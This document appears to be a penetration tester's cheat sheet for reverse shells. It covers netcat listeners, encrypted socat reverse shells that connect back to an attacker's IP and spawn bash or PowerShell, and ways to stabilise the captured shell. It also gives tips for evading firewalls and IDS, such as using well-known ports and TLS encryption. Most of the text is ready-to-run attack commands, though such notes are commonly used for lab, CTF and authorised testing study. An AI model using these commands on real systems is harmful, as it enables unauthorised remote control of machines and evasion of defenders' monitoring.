```Bash

```

## Netcat
The syntax for starting a netcat listener using Linux is this:
```Bash
nc -lvnp <port-number>
```
Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

## Socat
Although, it is same as netcat, but the real difference for which we would prefer this is encrypted shells. This often bypasses IDS system.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
We then need to merge the two created files into a single .pem file:
```bash
cat shell.key shell.crt > shell.pem
```
Now, when we set up our reverse shell listener, we use below command to listen on a port:
```bash
Listener -
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
Connector -
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
For Windows Target-
```bash
Listener -
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
Connector -
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:"powershell.exe,pipes"
```
## Shell Stablize
### Using Python
```Bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
This will give us access to term commands such as clear - 
```Bash
export TERM=xterm
```
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

### Using rlwrap
To use rlwrap, we invoke a slightly different listener:
```Bash
rlwrap nc -lvnp <port>
```
Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. 


